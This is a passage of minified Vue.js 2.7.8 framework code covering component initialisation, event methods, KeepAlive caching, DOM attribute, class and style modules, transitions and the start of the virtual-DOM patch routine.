i=0;i<a.length;i++)Nt(n,t,a[i]);else Nt(n,t,a)}}(n,e.watch)}var Mt={lazy:!0};function Rt(n,e,t){var a=!on();c(t)?(Lt.get=a?Ut(e):qt(t),Lt.set=z):(Lt.get=t.get?a&&!1!==t.cache?Ut(e):qt(t.get):z,Lt.set=t.set||z),Object.defineProperty(n,e,Lt)}function Ut(n){return function(){var e=this._computedWatchers&&this._computedWatchers[n];if(e)return e.dirty&&e.evaluate(),vn.target&&e.depend(),e.value}}function qt(n){return function(){return n.call(this,this)}}function Nt(n,e,t,a){return u(t)&&(a=t,t=t.handler),"string"==typeof t&&(t=n[t]),n.$watch(e,t,a)}var $t=0;function Ht(n){var e=n.options;if(n.super){var t=Ht(n.super);if(t!==n.superOptions){n.superOptions=t;var a=function(n){var e,t=n.options,a=n.sealedOptions;for(var r in t)t[r]!==a[r]&&(e||(e={}),e[r]=t[r]);return e}(n);a&&_(n.extendOptions,a),(e=n.options=jt(t,n.extendOptions)).name&&(e.components[e.name]=n)}}return e}function Vt(n){this._init(n)}function Jt(n){n.cid=0;var e=1;n.extend=function(n){n=n||{};var t=this,a=t.cid,r=n._Ctor||(n._Ctor={});if(r[a])return r[a];var i=ft(n)||ft(t.options);var o=function(n){this._init(n)};return(o.prototype=Object.create(t.prototype)).constructor=o,o.cid=e++,o.options=jt(t.options,n),o.super=t,o.options.props&&function(n){var e=n.options.props;for(var t in e)Ot(n.prototype,"_props",t)}(o),o.options.computed&&function(n){var e=n.options.computed;for(var t in e)Rt(n.prototype,t,e[t])}(o),o.extend=t.extend,o.mixin=t.mixin,o.use=t.use,U.forEach((function(n){o[n]=t[n]})),i&&(o.options.components[i]=o),o.superOptions=t.options,o.extendOptions=n,o.sealedOptions=_({},o.options),r[a]=o,o}}function Wt(n){return n&&(ft(n.Ctor.options)||n.tag)}function Qt(n,e){return r(n)?n.indexOf(e)>-1:"string"==typeof n?n.split(",").indexOf(e)>-1:!!m(n)&&n.test(e)}function Zt(n,e){var t=n.cache,a=n.keys,r=n._vnode;for(var i in t){var o=t[i];if(o){var s=o.name;s&&!e(s)&&Gt(t,i,a,r)}}}function Gt(n,e,t,a){var r=n[e];!r||a&&r.tag===a.tag||r.componentInstance.$destroy(),n[e]=null,E(t,e)}!function(n){n.prototype._init=function(n){var e=this;e._uid=$t++,e._isVue=!0,e.__v_skip=!0,e._scope=new qn(!0),n&&n._isComponent?function(n,e){var t=n.$options=Object.create(n.constructor.options),a=e._parentVnode;t.parent=e.parent,t._parentVnode=a;var r=a.componentOptions;t.propsData=r.propsData,t._parentListeners=r.listeners,t._renderChildren=r.children,t._componentTag=r.tag,e.render&&(t.render=e.render,t.staticRenderFns=e.staticRenderFns)}(e,n):e.$options=jt(Ht(e.constructor),n||{},e),e._renderProxy=e,e._self=e,function(n){var e=n.$options,t=e.parent;if(t&&!e.abstract){for(;t.$options.abstract&&t.$parent;)t=t.$parent;t.$children.push(n)}n.$parent=t,n.$root=t?t.$root:n,n.$children=[],n.$refs={},n._provided=t?t._provided:Object.create(null),n._watcher=null,n._inactive=null,n._directInactive=!1,n._isMounted=!1,n._isDestroyed=!1,n._isBeingDestroyed=!1}(e),function(n){n._events=Object.create(null),n._hasHookEvent=!1;var e=n.$options._parentListeners;e&&Qe(n,e)}(e),function(n){n._vnode=null,n._staticTrees=null;var e=n.$options,t=n.$vnode=e._parentVnode,r=t&&t.context;n.$slots=de(e._renderChildren,r),n.$scopedSlots=t?he(n.$parent,t.data.scopedSlots,n.$slots):a,n._c=function(e,t,a,r){return Be(n,e,t,a,r,!1)},n.$createElement=function(e,t,a,r){return Be(n,e,t,a,r,!0)};var i=t&&t.data;_n(n,"$attrs",i&&i.attrs||a,null,!0),_n(n,"$listeners",e._parentListeners||a,null,!0)}(e),Ye(e,"beforeCreate",void 0,!1),function(n){var e=ut(n.$options.inject,n);e&&(Sn(!1),Object.keys(e).forEach((function(t){_n(n,t,e[t])})),Sn(!0))}(e),Ft(e),function(n){var e=n.$options.provide;if(e){var t=c(e)?e.call(n):e;if(!p(t))return;for(var a=Nn(n),r=pn?Reflect.ownKeys(t):Object.keys(t),i=0;i<r.length;i++){var o=r[i];Object.defineProperty(a,o,Object.getOwnPropertyDescriptor(t,o))}}}(e),Ye(e,"created"),e.$options.el&&e.$mount(e.$options.el)}}(Vt),function(n){var e={get:function(){return this._data}},t={get:function(){return this._props}};Object.defineProperty(n.prototype,"$data",e),Object.defineProperty(n.prototype,"$props",t),n.prototype.$set=In,n.prototype.$delete=zn,n.prototype.$watch=function(n,e,t){if(u(e))return Nt(this,n,e,t);(t=t||{}).user=!0;var a=new He(this,n,e,t);if(t.immediate){var r='callback for immediate watcher "'.concat(a.expression,'"');En(),Ce(e,this,[a.value],this,r),kn()}return function(){a.teardown()}}}(Vt),function(n){var e=/^hook:/;n.prototype.$on=function(n,t){var a=this;if(r(n))for(var i=0,o=n.length;i<o;i++)a.$on(n[i],t);else(a._events[n]||(a._events[n]=[])).push(t),e.test(n)&&(a._hasHookEvent=!0);return a},n.prototype.$once=function(n,e){var t=this;function a(){t.$off(n,a),e.apply(t,arguments)}return a.fn=e,t.$on(n,a),t},n.prototype.$off=function(n,e){var t=this;if(!arguments.length)return t._events=Object.create(null),t;if(r(n)){for(var a=0,i=n.length;a<i;a++)t.$off(n[a],e);return t}var o,s=t._events[n];if(!s)return t;if(!e)return t._events[n]=null,t;for(var l=s.length;l--;)if((o=s[l])===e||o.fn===e){s.splice(l,1);break}return t},n.prototype.$emit=function(n){var e=this,t=e._events[n];if(t){t=t.length>1?P(t):t;for(var a=P(arguments,1),r='event handler for "'.concat(n,'"'),i=0,o=t.length;i<o;i++)Ce(t[i],e,a,e,r)}return e}}(Vt),function(n){n.prototype._update=function(n,e){var t=this,a=t.$el,r=t._vnode,i=Ge(t);t._vnode=n,t.$el=r?t.__patch__(r,n):t.__patch__(t.$el,n,e,!1),i(),a&&(a.__vue__=null),t.$el&&(t.$el.__vue__=t),t.$vnode&&t.$parent&&t.$vnode===t.$parent._vnode&&(t.$parent.$el=t.$el)},n.prototype.$forceUpdate=function(){this._watcher&&this._watcher.update()},n.prototype.$destroy=function(){var n=this;if(!n._isBeingDestroyed){Ye(n,"beforeDestroy"),n._isBeingDestroyed=!0;var e=n.$parent;!e||e._isBeingDestroyed||n.$options.abstract||E(e.$children,n),n._scope.stop(),n._data.__ob__&&n._data.__ob__.vmCount--,n._isDestroyed=!0,n.__patch__(n._vnode,null),Ye(n,"destroyed"),n.$off(),n.$el&&(n.$el.__vue__=null),n.$vnode&&(n.$vnode.parent=null)}}}(Vt),function(n){pe(n.prototype),n.prototype.$nextTick=function(n){return Me(n,this)},n.prototype._render=function(){var n,e=this,t=e.$options,a=t.render,i=t._parentVnode;i&&e._isMounted&&(e.$scopedSlots=he(e.$parent,i.data.scopedSlots,e.$slots,e.$scopedSlots),e._slotsProxy&&Ee(e._slotsProxy,e.$scopedSlots)),e.$vnode=i;try{un(e),ke=e,n=a.call(e._renderProxy,e.$createElement)}catch(t){Ae(t,e,"render"),n=e._vnode}finally{ke=null,un()}return r(n)&&1===n.length&&(n=n[0]),n instanceof mn||(n=hn()),n.parent=i,n}}(Vt);var Kt=[String,RegExp,Array],Xt={KeepAlive:{name:"keep-alive",abstract:!0,props:{include:Kt,exclude:Kt,max:[String,Number]},methods:{cacheVNode:function(){var n=this.cache,e=this.keys,t=this.vnodeToCache,a=this.keyToCache;if(t){var r=t.tag,i=t.componentInstance,o=t.componentOptions;n[a]={name:Wt(o),tag:r,componentInstance:i},e.push(a),this.max&&e.length>parseInt(this.max)&&Gt(n,e[0],e,this._vnode),this.vnodeToCache=null}}},created:function(){this.cache=Object.create(null),this.keys=[]},destroyed:function(){for(var n in this.cache)Gt(this.cache,n,this.keys)},mounted:function(){var n=this;this.cacheVNode(),this.$watch("include",(function(e){Zt(n,(function(n){return Qt(e,n)}))})),this.$watch("exclude",(function(e){Zt(n,(function(n){return!Qt(e,n)}))}))},updated:function(){this.cacheVNode()},render:function(){var n=this.$slots.default,e=we(n),t=e&&e.componentOptions;if(t){var a=Wt(t),r=this.include,i=this.exclude;if(r&&(!a||!Qt(r,a))||i&&a&&Qt(i,a))return e;var o=this.cache,s=this.keys,l=null==e.key?t.Ctor.cid+(t.tag?"::".concat(t.tag):""):e.key;o[l]?(e.componentInstance=o[l].componentInstance,E(s,l),s.push(l)):(this.vnodeToCache=e,this.keyToCache=l),e.data.keepAlive=!0}return e||n&&n[0]}}};!function(n){var e={get:function(){return N}};Object.defineProperty(n,"config",e),n.util={warn:kt,extend:_,mergeOptions:jt,defineReactive:_n},n.set=In,n.delete=zn,n.nextTick=Me,n.observable=function(n){return Pn(n),n},n.options=Object.create(null),U.forEach((function(e){n.options[e+"s"]=Object.create(null)})),n.options._base=n,_(n.options.components,Xt),function(n){n.use=function(n){var e=this._installedPlugins||(this._installedPlugins=[]);if(e.indexOf(n)>-1)return this;var t=P(arguments,1);return t.unshift(this),c(n.install)?n.install.apply(n,t):c(n)&&n.apply(null,t),e.push(n),this}}(n),function(n){n.mixin=function(n){return this.options=jt(this.options,n),this}}(n),Jt(n),function(n){U.forEach((function(e){n[e]=function(n,t){return t?("component"===e&&u(t)&&(t.name=t.name||n,t=this.options._base.extend(t)),"directive"===e&&c(t)&&(t={bind:t,update:t}),this.options[e+"s"][n]=t,t):this.options[e+"s"][n]}}))}(n)}(Vt),Object.defineProperty(Vt.prototype,"$isServer",{get:on}),Object.defineProperty(Vt.prototype,"$ssrContext",{get:function(){return this.$vnode&&this.$vnode.ssrContext}}),Object.defineProperty(Vt,"FunctionalRenderContext",{value:mt}),Vt.version="2.7.8";var Yt=v("style,class"),na=v("input,textarea,option,select,progress"),ea=v("contenteditable,draggable,spellcheck"),ta=v("events,caret,typing,plaintext-only"),aa=v("allowfullscreen,async,autofocus,autoplay,checked,compact,controls,declare,default,defaultchecked,defaultmuted,defaultselected,defer,disabled,enabled,formnovalidate,hidden,indeterminate,inert,ismap,itemscope,loop,multiple,muted,nohref,noresize,noshade,novalidate,nowrap,open,pauseonexit,readonly,required,reversed,scoped,seamless,selected,sortable,truespeed,typemustmatch,visible"),ra="http://www.w3.org/1999/xlink",ia=function(n){return":"===n.charAt(5)&&"xlink"===n.slice(0,5)},oa=function(n){return ia(n)?n.slice(6,n.length):""},sa=function(n){return null==n||!1===n};function la(n){for(var e=n.data,t=n,a=n;o(a.componentInstance);)(a=a.componentInstance._vnode)&&a.data&&(e=ca(a.data,e));for(;o(t=t.parent);)t&&t.data&&(e=ca(e,t.data));return function(n,e){if(o(n)||o(e))return pa(n,da(e));return""}(e.staticClass,e.class)}function ca(n,e){return{staticClass:pa(n.staticClass,e.staticClass),class:o(n.class)?[n.class,e.class]:e.class}}function pa(n,e){return n?e?n+" "+e:n:e||""}function da(n){return Array.isArray(n)?function(n){for(var e,t="",a=0,r=n.length;a<r;a++)o(e=da(n[a]))&&""!==e&&(t&&(t+=" "),t+=e);return t}(n):p(n)?function(n){var e="";for(var t in n)n[t]&&(e&&(e+=" "),e+=t);return e}(n):"string"==typeof n?n:""}var ua={svg:"http://www.w3.org/2000/svg",math:"http://www.w3.org/1998/Math/MathML"},ma=v("html,body,base,head,link,meta,style,title,address,article,aside,footer,header,h1,h2,h3,h4,h5,h6,hgroup,nav,section,div,dd,dl,dt,figcaption,figure,picture,hr,img,li,main,ol,p,pre,ul,a,b,abbr,bdi,bdo,br,cite,code,data,dfn,em,i,kbd,mark,q,rp,rt,rtc,ruby,s,samp,small,span,strong,sub,sup,time,u,var,wbr,area,audio,map,track,video,embed,object,param,source,canvas,script,noscript,del,ins,caption,col,colgroup,table,thead,tbody,td,th,tr,button,datalist,fieldset,form,input,label,legend,meter,optgroup,option,output,progress,select,textarea,details,dialog,menu,menuitem,summary,content,element,shadow,template,blockquote,iframe,tfoot"),ha=v("svg,animate,circle,clippath,cursor,defs,desc,ellipse,filter,font-face,foreignobject,g,glyph,image,line,marker,mask,missing-glyph,path,pattern,polygon,polyline,rect,switch,symbol,text,textpath,tspan,use,view",!0),ga=function(n){return ma(n)||ha(n)};var fa=Object.create(null);var ba=v("text,number,password,search,email,tel,url");var va=Object.freeze({__proto__:null,createElement:function(n,e){var t=document.createElement(n);return"select"!==n||e.data&&e.data.attrs&&void 0!==e.data.attrs.multiple&&t.setAttribute("multiple","multiple"),t},createElementNS:function(n,e){return document.createElementNS(ua[n],e)},createTextNode:function(n){return document.createTextNode(n)},createComment:function(n){return document.createComment(n)},insertBefore:function(n,e,t){n.insertBefore(e,t)},removeChild:function(n,e){n.removeChild(e)},appendChild:function(n,e){n.appendChild(e)},parentNode:function(n){return n.parentNode},nextSibling:function(n){return n.nextSibling},tagName:function(n){return n.tagName},setTextContent:function(n,e){n.textContent=e},setStyleScope:function(n,e){n.setAttribute(e,"")}}),ya={create:function(n,e){Ea(e)},update:function(n,e){n.data.ref!==e.data.ref&&(Ea(n,!0),Ea(e))},destroy:function(n){Ea(n,!0)}};function Ea(n,e){var t=n.data.ref;if(o(t)){var a=n.context,i=n.componentInstance||n.elm,s=e?null:i,l=e?void 0:i;if(c(t))Ce(t,a,[s],a,"template ref function");else{var p=n.data.refInFor,d="string"==typeof t||"number"==typeof t,u=Mn(t),m=a.$refs;if(d||u)if(p){var h=d?m[t]:t.value;e?r(h)&&E(h,i):r(h)?h.includes(i)||h.push(i):d?(m[t]=[i],ka(a,t,m[t])):t.value=[i]}else if(d){if(e&&m[t]!==i)return;m[t]=l,ka(a,t,s)}else if(u){if(e&&t.value!==i)return;t.value=s}else 0}}}function ka(n,e,t){var a=n._setupState;a&&x(a,e)&&(Mn(a[e])?a[e].value=t:a[e]=t)}var xa=new mn("",{},[]),wa=["create","activate","update","remove","destroy"];function Ba(n,e){return n.key===e.key&&n.asyncFactory===e.asyncFactory&&(n.tag===e.tag&&n.isComment===e.isComment&&o(n.data)===o(e.data)&&function(n,e){if("input"!==n.tag)return!0;var t,a=o(t=n.data)&&o(t=t.attrs)&&t.type,r=o(t=e.data)&&o(t=t.attrs)&&t.type;return a===r||ba(a)&&ba(r)}(n,e)||s(n.isAsyncPlaceholder)&&i(e.asyncFactory.error))}function Aa(n,e,t){var a,r,i={};for(a=e;a<=t;++a)o(r=n[a].key)&&(i[r]=a);return i}var Ca={create:Sa,update:Sa,destroy:function(n){Sa(n,xa)}};function Sa(n,e){(n.data.directives||e.data.directives)&&function(n,e){var t,a,r,i=n===xa,o=e===xa,s=Ta(n.data.directives,n.context),l=Ta(e.data.directives,e.context),c=[],p=[];for(t in l)a=s[t],r=l[t],a?(r.oldValue=a.value,r.oldArg=a.arg,_a(r,"update",e,n),r.def&&r.def.componentUpdated&&p.push(r)):(_a(r,"bind",e,n),r.def&&r.def.inserted&&c.push(r));if(c.length){var d=function(){for(var t=0;t<c.length;t++)_a(c[t],"inserted",e,n)};i?Jn(e,"insert",d):d()}p.length&&Jn(e,"postpatch",(function(){for(var t=0;t<p.length;t++)_a(p[t],"componentUpdated",e,n)}));if(!i)for(t in s)l[t]||_a(s[t],"unbind",n,n,o)}(n,e)}var ja=Object.create(null);function Ta(n,e){var t,a,r=Object.create(null);if(!n)return r;for(t=0;t<n.length;t++)(a=n[t]).modifiers||(a.modifiers=ja),r[Pa(a)]=a,e._setupState&&e._setupState.__sfc&&(a.def=a.def||Tt(e,"_setupState","v-"+a.name)),a.def=a.def||Tt(e.$options,"directives",a.name);return r}function Pa(n){return n.rawName||"".concat(n.name,".").concat(Object.keys(n.modifiers||{}).join("."))}function _a(n,e,t,a,r){var i=n.def&&n.def[e];if(i)try{i(t.elm,n,t,a,r)}catch(a){Ae(a,t.context,"directive ".concat(n.name," ").concat(e," hook"))}}var Ia=[ya,Ca];function za(n,e){var t=e.componentOptions;if(!(o(t)&&!1===t.Ctor.options.inheritAttrs||i(n.data.attrs)&&i(e.data.attrs))){var a,r,l=e.elm,c=n.data.attrs||{},p=e.data.attrs||{};for(a in(o(p.__ob__)||s(p._v_attr_proxy))&&(p=e.data.attrs=_({},p)),p)r=p[a],c[a]!==r&&Da(l,a,r,e.data.pre);for(a in(G||X)&&p.value!==c.value&&Da(l,"value",p.value),c)i(p[a])&&(ia(a)?l.removeAttributeNS(ra,oa(a)):ea(a)||l.removeAttribute(a))}}function Da(n,e,t,a){a||n.tagName.indexOf("-")>-1?La(n,e,t):aa(e)?sa(t)?n.removeAttribute(e):(t="allowfullscreen"===e&&"EMBED"===n.tagName?"true":e,n.setAttribute(e,t)):ea(e)?n.setAttribute(e,function(n,e){return sa(e)||"false"===e?"false":"contenteditable"===n&&ta(e)?e:"true"}(e,t)):ia(e)?sa(t)?n.removeAttributeNS(ra,oa(e)):n.setAttributeNS(ra,e,t):La(n,e,t)}function La(n,e,t){if(sa(t))n.removeAttribute(e);else{if(G&&!K&&"TEXTAREA"===n.tagName&&"placeholder"===e&&""!==t&&!n.__ieph){var a=function(e){e.stopImmediatePropagation(),n.removeEventListener("input",a)};n.addEventListener("input",a),n.__ieph=!0}n.setAttribute(e,t)}}var Oa={create:za,update:za};function Fa(n,e){var t=e.elm,a=e.data,r=n.data;if(!(i(a.staticClass)&&i(a.class)&&(i(r)||i(r.staticClass)&&i(r.class)))){var s=la(e),l=t._transitionClasses;o(l)&&(s=pa(s,da(l))),s!==t._prevClass&&(t.setAttribute("class",s),t._prevClass=s)}}var Ma,Ra={create:Fa,update:Fa};function Ua(n,e,t){var a=Ma;return function r(){var i=e.apply(null,arguments);null!==i&&$a(n,r,t,a)}}var qa=Pe&&!(en&&Number(en[1])<=53);function Na(n,e,t,a){if(qa){var r=ot,i=e;e=i._wrapper=function(n){if(n.target===n.currentTarget||n.timeStamp>=r||n.timeStamp<=0||n.target.ownerDocument!==document)return i.apply(this,arguments)}}Ma.addEventListener(n,e,an?{capture:t,passive:a}:t)}function $a(n,e,t,a){(a||Ma).removeEventListener(n,e._wrapper||e,t)}function Ha(n,e){if(!i(n.data.on)||!i(e.data.on)){var t=e.data.on||{},a=n.data.on||{};Ma=e.elm||n.elm,function(n){if(o(n.__r)){var e=G?"change":"input";n[e]=[].concat(n.__r,n[e]||[]),delete n.__r}o(n.__c)&&(n.change=[].concat(n.__c,n.change||[]),delete n.__c)}(t),Vn(t,a,Na,$a,Ua,e.context),Ma=void 0}}var Va,Ja={create:Ha,update:Ha,destroy:function(n){return Ha(n,xa)}};function Wa(n,e){if(!i(n.data.domProps)||!i(e.data.domProps)){var t,a,r=e.elm,l=n.data.domProps||{},c=e.data.domProps||{};for(t in(o(c.__ob__)||s(c._v_attr_proxy))&&(c=e.data.domProps=_({},c)),l)t in c||(r[t]="");for(t in c){if(a=c[t],"textContent"===t||"innerHTML"===t){if(e.children&&(e.children.length=0),a===l[t])continue;1===r.childNodes.length&&r.removeChild(r.childNodes[0])}if("value"===t&&"PROGRESS"!==r.tagName){r._value=a;var p=i(a)?"":String(a);Qa(r,p)&&(r.value=p)}else if("innerHTML"===t&&ha(r.tagName)&&i(r.innerHTML)){(Va=Va||document.createElement("div")).innerHTML="<svg>".concat(a,"</svg>");for(var d=Va.firstChild;r.firstChild;)r.removeChild(r.firstChild);for(;d.firstChild;)r.appendChild(d.firstChild)}else if(a!==l[t])try{r[t]=a}catch(n){}}}}function Qa(n,e){return!n.composing&&("OPTION"===n.tagName||function(n,e){var t=!0;try{t=document.activeElement!==n}catch(n){}return t&&n.value!==e}(n,e)||function(n,e){var t=n.value,a=n._vModifiers;if(o(a)){if(a.number)return b(t)!==b(e);if(a.trim)return t.trim()!==e.trim()}return t!==e}(n,e))}var Za={create:Wa,update:Wa},Ga=w((function(n){var e={},t=/:(.+)/;return n.split(/;(?![^(]*\))/g).forEach((function(n){if(n){var a=n.split(t);a.length>1&&(e[a[0].trim()]=a[1].trim())}})),e}));function Ka(n){var e=Xa(n.style);return n.staticStyle?_(n.staticStyle,e):e}function Xa(n){return Array.isArray(n)?I(n):"string"==typeof n?Ga(n):n}var Ya,nr=/^--/,er=/\s*!important$/,tr=function(n,e,t){if(nr.test(e))n.style.setProperty(e,t);else if(er.test(t))n.style.setProperty(j(e),t.replace(er,""),"important");else{var a=rr(e);if(Array.isArray(t))for(var r=0,i=t.length;r<i;r++)n.style[a]=t[r];else n.style[a]=t}},ar=["Webkit","Moz","ms"],rr=w((function(n){if(Ya=Ya||document.createElement("div").style,"filter"!==(n=A(n))&&n in Ya)return n;for(var e=n.charAt(0).toUpperCase()+n.slice(1),t=0;t<ar.length;t++){var a=ar[t]+e;if(a in Ya)return a}}));function ir(n,e){var t=e.data,a=n.data;if(!(i(t.staticStyle)&&i(t.style)&&i(a.staticStyle)&&i(a.style))){var r,s,l=e.elm,c=a.staticStyle,p=a.normalizedStyle||a.style||{},d=c||p,u=Xa(e.data.style)||{};e.data.normalizedStyle=o(u.__ob__)?_({},u):u;var m=function(n,e){var t,a={};if(e)for(var r=n;r.componentInstance;)(r=r.componentInstance._vnode)&&r.data&&(t=Ka(r.data))&&_(a,t);(t=Ka(n.data))&&_(a,t);for(var i=n;i=i.parent;)i.data&&(t=Ka(i.data))&&_(a,t);return a}(e,!0);for(s in d)i(m[s])&&tr(l,s,"");for(s in m)(r=m[s])!==d[s]&&tr(l,s,null==r?"":r)}}var or={create:ir,update:ir},sr=/\s+/;function lr(n,e){if(e&&(e=e.trim()))if(n.classList)e.indexOf(" ")>-1?e.split(sr).forEach((function(e){return n.classList.add(e)})):n.classList.add(e);else{var t=" ".concat(n.getAttribute("class")||""," ");t.indexOf(" "+e+" ")<0&&n.setAttribute("class",(t+e).trim())}}function cr(n,e){if(e&&(e=e.trim()))if(n.classList)e.indexOf(" ")>-1?e.split(sr).forEach((function(e){return n.classList.remove(e)})):n.classList.remove(e),n.classList.length||n.removeAttribute("class");else{for(var t=" ".concat(n.getAttribute("class")||""," "),a=" "+e+" ";t.indexOf(a)>=0;)t=t.replace(a," ");(t=t.trim())?n.setAttribute("class",t):n.removeAttribute("class")}}function pr(n){if(n){if("object"==typeof n){var e={};return!1!==n.css&&_(e,dr(n.name||"v")),_(e,n),e}return"string"==typeof n?dr(n):void 0}}var dr=w((function(n){return{enterClass:"".concat(n,"-enter"),enterToClass:"".concat(n,"-enter-to"),enterActiveClass:"".concat(n,"-enter-active"),leaveClass:"".concat(n,"-leave"),leaveToClass:"".concat(n,"-leave-to"),leaveActiveClass:"".concat(n,"-leave-active")}})),ur=Q&&!K,mr="transition",hr="transitionend",gr="animation",fr="animationend";ur&&(void 0===window.ontransitionend&&void 0!==window.onwebkittransitionend&&(mr="WebkitTransition",hr="webkitTransitionEnd"),void 0===window.onanimationend&&void 0!==window.onwebkitanimationend&&(gr="WebkitAnimation",fr="webkitAnimationEnd"));var br=Q?window.requestAnimationFrame?window.requestAnimationFrame.bind(window):setTimeout:function(n){return n()};function vr(n){br((function(){br(n)}))}function yr(n,e){var t=n._transitionClasses||(n._transitionClasses=[]);t.indexOf(e)<0&&(t.push(e),lr(n,e))}function Er(n,e){n._transitionClasses&&E(n._transitionClasses,e),cr(n,e)}function kr(n,e,t){var a=wr(n,e),r=a.type,i=a.timeout,o=a.propCount;if(!r)return t();var s="transition"===r?hr:fr,l=0,c=function(){n.removeEventListener(s,p),t()},p=function(e){e.target===n&&++l>=o&&c()};setTimeout((function(){l<o&&c()}),i+1),n.addEventListener(s,p)}var xr=/\b(transform|all)(,|$)/;function wr(n,e){var t,a=window.getComputedStyle(n),r=(a[mr+"Delay"]||"").split(", "),i=(a[mr+"Duration"]||"").split(", "),o=Br(r,i),s=(a[gr+"Delay"]||"").split(", "),l=(a[gr+"Duration"]||"").split(", "),c=Br(s,l),p=0,d=0;return"transition"===e?o>0&&(t="transition",p=o,d=i.length):"animation"===e?c>0&&(t="animation",p=c,d=l.length):d=(t=(p=Math.max(o,c))>0?o>c?"transition":"animation":null)?"transition"===t?i.length:l.length:0,{type:t,timeout:p,propCount:d,hasTransform:"transition"===t&&xr.test(a[mr+"Property"])}}function Br(n,e){for(;n.length<e.length;)n=n.concat(n);return Math.max.apply(null,e.map((function(e,t){return Ar(e)+Ar(n[t])})))}function Ar(n){return 1e3*Number(n.slice(0,-1).replace(",","."))}function Cr(n,e){var t=n.elm;o(t._leaveCb)&&(t._leaveCb.cancelled=!0,t._leaveCb());var a=pr(n.data.transition);if(!i(a)&&!o(t._enterCb)&&1===t.nodeType){for(var r=a.css,s=a.type,l=a.enterClass,d=a.enterToClass,u=a.enterActiveClass,m=a.appearClass,h=a.appearToClass,g=a.appearActiveClass,f=a.beforeEnter,v=a.enter,y=a.afterEnter,E=a.enterCancelled,k=a.beforeAppear,x=a.appear,w=a.afterAppear,B=a.appearCancelled,A=a.duration,C=Ze,S=Ze.$vnode;S&&S.parent;)C=S.context,S=S.parent;var j=!C._isMounted||!n.isRootInsert;if(!j||x||""===x){var T=j&&m?m:l,P=j&&g?g:u,_=j&&h?h:d,I=j&&k||f,z=j&&c(x)?x:v,D=j&&w||y,L=j&&B||E,O=b(p(A)?A.enter:A);0;var F=!1!==r&&!K,R=Tr(z),U=t._enterCb=M((function(){F&&(Er(t,_),Er(t,P)),U.cancelled?(F&&Er(t,T),L&&L(t)):D&&D(t),t._enterCb=null}));n.data.show||Jn(n,"insert",(function(){var e=t.parentNode,a=e&&e._pending&&e._pending[n.key];a&&a.tag===n.tag&&a.elm._leaveCb&&a.elm._leaveCb(),z&&z(t,U)})),I&&I(t),F&&(yr(t,T),yr(t,P),vr((function(){Er(t,T),U.cancelled||(yr(t,_),R||(jr(O)?setTimeout(U,O):kr(t,s,U)))}))),n.data.show&&(e&&e(),z&&z(t,U)),F||R||U()}}}function Sr(n,e){var t=n.elm;o(t._enterCb)&&(t._enterCb.cancelled=!0,t._enterCb());var a=pr(n.data.transition);if(i(a)||1!==t.nodeType)return e();if(!o(t._leaveCb)){var r=a.css,s=a.type,l=a.leaveClass,c=a.leaveToClass,d=a.leaveActiveClass,u=a.beforeLeave,m=a.leave,h=a.afterLeave,g=a.leaveCancelled,f=a.delayLeave,v=a.duration,y=!1!==r&&!K,E=Tr(m),k=b(p(v)?v.leave:v);0;var x=t._leaveCb=M((function(){t.parentNode&&t.parentNode._pending&&(t.parentNode._pending[n.key]=null),y&&(Er(t,c),Er(t,d)),x.cancelled?(y&&Er(t,l),g&&g(t)):(e(),h&&h(t)),t._leaveCb=null}));f?f(w):w()}function w(){x.cancelled||(!n.data.show&&t.parentNode&&((t.parentNode._pending||(t.parentNode._pending={}))[n.key]=n),u&&u(t),y&&(yr(t,l),yr(t,d),vr((function(){Er(t,l),x.cancelled||(yr(t,c),E||(jr(k)?setTimeout(x,k):kr(t,s,x)))}))),m&&m(t,x),y||E||x())}}function jr(n){return"number"==typeof n&&!isNaN(n)}function Tr(n){if(i(n))return!1;var e=n.fns;return o(e)?Tr(Array.isArray(e)?e[0]:e):(n._length||n.length)>1}function Pr(n,e){!0!==e.data.show&&Cr(e)}var _r=function(n){var e,t,a={},c=n.modules,p=n.nodeOps;for(e=0;e<wa.length;++e)for(a[wa[e]]=[],t=0;t<c.length;++t)o(c[t][wa[e]])&&a[wa[e]].push(c[t][wa[e]]);function d(n){var e=p.parentNode(n);o(e)&&p.removeChild(e,n)}function u(n,e,t,r,i,l,c){if(o(n.elm)&&o(l)&&(n=l[c]=fn(n)),n.isRootInsert=!i,!function(n,e,t,r){var i=n.data;if(o(i)){var l=o(n.componentInstance)&&i.keepAlive;if(o(i=i.hook)&&o(i=i.init)&&i(n,!1),o(n.componentInstance))return m(n,e),h(t,n.elm,r),s(l)&&function(n,e,t,r){var i,s=n;for(;s.componentInstance;)if(s=s.componentInstance._vnode,o(i=s.data)&&o(i=i.transition)){for(i=0;i<a.activate.length;++i)a.activate[i](xa,s);e.push(s);break}h(t,n.elm,r)}(n,e,t,r),!0}}(n,e,t,r)){var d=n.data,u=n.children,f=n.tag;o(f)?(n.elm=n.ns?p.createElementNS(n.ns,f):p.createElement(f,n),y(n),g(n,u,e),o(d)&&b(n,e),h(t,n.elm,r)):s(n.isComment)?(n.elm=p.createComment(n.text),h(t,n.elm,r)):(n.elm=p.createTextNode(n.text),h(t,n.elm,r))}}function m(n,e){o(n.data.pendingInsert)&&(e.push.apply(e,n.data.pendingInsert),n.data.pendingInsert=null),n.elm=n.componentInstance.$el,f(n)?(b(n,e),y(n)):(Ea(n),e.push(n))}function h(n,e,t){o(n)&&(o(t)?p.parentNode(t)===n&&p.insertBefore(n,e,t):p.appendChild(n,e))}function g(n,e,t){if(r(e)){0;for(var a=0;a<e.length;++a)u(e[a],t,n.elm,null,!0,e,a)}else l(n.text)&&p.appendChild(n.elm,p.createTextNode(String(n.text)))}function f(n){for(;n.componentInstance;)n=n.componentInstance._vnode;return o(n.tag)}function b(n,t){for(var r=0;r<a.create.length;++r)a.create[r](xa,n);o(e=n.data.hook)&&(o(e.create)&&e.create(xa,n),o(e.insert)&&t.push(n))}function y(n){var e;if(o(e=n.fnScopeId))p.setStyleScope(n.elm,e);else for(var t=n;t;)o(e=t.context)&&o(e=e.$options._scopeId)&&p.setStyleScope(n.elm,e),t=t.parent;o(e=Ze)&&e!==n.context&&e!==n.fnContext&&o(e=e.$options._scopeId)&&p.setStyleScope(n.elm,e)}function E(n,e,t,a,r,i){for(;a<=r;++a)u(t[a],i,n,e,!1,t,a)}function k(n){var e,t,r=n.data;if(o(r))for(o(e=r.hook)&&o(e=e.destroy)&&e(n),e=0;e<a.destroy.length;++e)a.destroy[e](n);if(o(e=n.children))for(t=0;t<n.children.length;++t)k(n.children[t])}function x(n,e,t){for(;e<=t;++e){var a=n[e];o(a)&&(o(a.tag)?(w(a),k(a)):d(a.elm))}}function w(n,e){if(o(e)||o(n.data)){var 